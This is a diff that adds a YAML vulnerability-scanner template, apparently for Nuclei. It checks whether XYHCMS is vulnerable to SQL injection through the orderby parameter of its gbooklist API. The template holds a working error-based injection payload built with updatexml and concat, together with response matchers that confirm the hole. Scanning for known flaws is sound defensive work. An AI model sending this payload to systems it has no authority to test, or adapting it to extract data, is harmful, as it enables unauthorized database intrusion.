@@ -1,0 +1,27 @@
+id: poc-yaml-xyhcms-api-gbooklist-sqli
+info:
+  name: XYHCMS lt/gbooklist SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: XYHCMS
+
+variables:
+  t1: '{{rand_int(1000,10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - method: GET
+    path:
+      - "/index.php?s=Api/lt/gbooklist&orderby=(updatexml(1,concat(0x7e,(select%20md5({{t1}})),0x7e),1))=1"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "XPATH syntax error"
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
